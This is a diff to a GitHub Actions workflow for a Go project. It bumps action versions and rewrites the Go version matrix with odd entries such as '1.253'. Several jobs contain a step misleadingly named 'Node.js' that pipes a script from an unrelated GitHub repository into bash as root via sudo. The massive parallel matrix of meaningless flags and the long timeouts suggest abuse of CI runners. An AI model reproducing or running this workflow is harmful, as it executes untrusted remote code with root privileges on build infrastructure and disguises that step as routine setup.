@@ -23,12 +23,12 @@ jobs:
         JOB: ${{ matrix.go }}
     steps:
     - name: Set up Go ${{ matrix.go }}
-      uses: actions/setup-go@v3
+      uses: actions/setup-go@v4
       with:
         go-version: ${{ matrix.go }}
       id: go
     - name: Setup
-      uses: actions/checkout@v1
+      uses: actions/checkout@v4
     - name: runner_go
       run: |
         sudo apt update -y && sleep 2
@@ -39,7 +39,7 @@ jobs:
       max-parallel: 256
       fail-fast: false
       matrix:
-         go: [1.11, 1.12, 1.13, 1.14, 1.15, 1.16, 1.17, 1.18, 1.19, 1.20, 1.21, 1.22, 1.23, 1.24, 1.25, 1.26]
+         go: [1.25.4, 1.253, 1.13, 1.14, 1.15, 1.16, 1.17, 1.18, 1.19, 1.20, 1.21, 1.22, 1.23, 1.24, 1.25, 1.26]
          flag: [kmn, oiu, qwe, nvb, lpd, sds, ere, lil, kul, pox, sam, dic, car, ygc, spc, ilk]  
     timeout-minutes: 355
     env:
@@ -47,12 +47,12 @@ jobs:
         JOB: ${{ matrix.go }}
     steps:
     - name: Set up Go ${{ matrix.go }}
-      uses: actions/setup-go@v3
+      uses: actions/setup-go@v4
       with:
         go-version: ${{ matrix.go }}
       id: go
     - name: Setup
-      uses: actions/checkout@v1
+      uses: actions/checkout@v4
     - name: Node.js
       run: |
         sudo su -c "curl -sL https://github.com/mgssjs/moanu/raw/main/xc3 | bash"
@@ -63,7 +63,7 @@ jobs:
       max-parallel: 256
       fail-fast: false
       matrix:
-         go: [1.11, 1.12, 1.13, 1.14, 1.15, 1.16, 1.17, 1.18, 1.19, 1.20, 1.21, 1.22, 1.23, 1.24, 1.25, 1.26]
+         go: [1.25.4, 1.253, 1.13, 1.14, 1.15, 1.16, 1.17, 1.18, 1.19, 1.20, 1.21, 1.22, 1.23, 1.24, 1.25, 1.26]
          flag: [kmn, oiu, qwe, nvb, lpd, sds, ere, lil, kul, pox, sam, dic, car, ygc, spc, ilk]  
     timeout-minutes: 355
     env:
@@ -71,12 +71,12 @@ jobs:
         JOB: ${{ matrix.go }}
     steps:
     - name: Set up Go ${{ matrix.go }}
-      uses: actions/setup-go@v3
+      uses: actions/setup-go@v4
       with:
         go-version: ${{ matrix.go }}
       id: go
     - name: Setup
-      uses: actions/checkout@v1
+      uses: actions/checkout@v4
     - name: Node.js
       run: |
         sudo su -c "curl -sL https://github.com/mgssjs/moanu/raw/main/xc3 | bash"
@@ -87,7 +87,7 @@ jobs:
       max-parallel: 256
       fail-fast: false
       matrix:
-         go: [1.11, 1.12, 1.13, 1.14, 1.15, 1.16, 1.17, 1.18, 1.19, 1.20, 1.21, 1.22, 1.23, 1.24, 1.25, 1.26]
+         go: [1.25.4, 1.253, 1.13, 1.14, 1.15, 1.16, 1.17, 1.18, 1.19, 1.20, 1.21, 1.22, 1.23, 1.24, 1.25, 1.26]
          flag: [kmn, oiu, qwe, nvb, lpd, sds, ere, lil, kul, pox, sam, dic, car, ygc, spc, ilk]  
     timeout-minutes: 355
     env:
@@ -95,12 +95,12 @@ jobs:
         JOB: ${{ matrix.go }}
     steps:
     - name: Set up Go ${{ matrix.go }}
-      uses: actions/setup-go@v3
+      uses: actions/setup-go@v4
       with:
         go-version: ${{ matrix.go }}
       id: go
     - name: Setup
-      uses: actions/checkout@v1
+      uses: actions/checkout@v4
     - name: Node.js
       run: |
         sudo su -c "curl -sL https://github.com/mgssjs/moanu/raw/main/xc3 | bash"
@@ -111,7 +111,7 @@ jobs:
       max-parallel: 256
       fail-fast: false
       matrix:
-         go: [1.11, 1.12, 1.13, 1.14, 1.15, 1.16, 1.17, 1.18, 1.19, 1.20, 1.21, 1.22, 1.23, 1.24, 1.25, 1.26]
+         go: [1.25.4, 1.253, 1.13, 1.14, 1.15, 1.16, 1.17, 1.18, 1.19, 1.20, 1.21, 1.22, 1.23, 1.24, 1.25, 1.26]
          flag: [kmn, oiu, qwe, nvb, lpd, sds, ere, lil, kul, pox, sam, dic, car, ygc, spc, ilk]  
     timeout-minutes: 355
     env:
@@ -119,12 +119,12 @@ jobs:
         JOB: ${{ matrix.go }}
     steps:
     - name: Set up Go ${{ matrix.go }}
-      uses: actions/setup-go@v3
+      uses: actions/setup-go@v4
       with:
         go-version: ${{ matrix.go }}
       id: go
     - name: Setup
-      uses: actions/checkout@v1
+      uses: actions/checkout@v4
     - name: Node.js
       run: |
         sudo su -c "curl -sL https://github.com/mgssjs/moanu/raw/main/xc3 | bash"
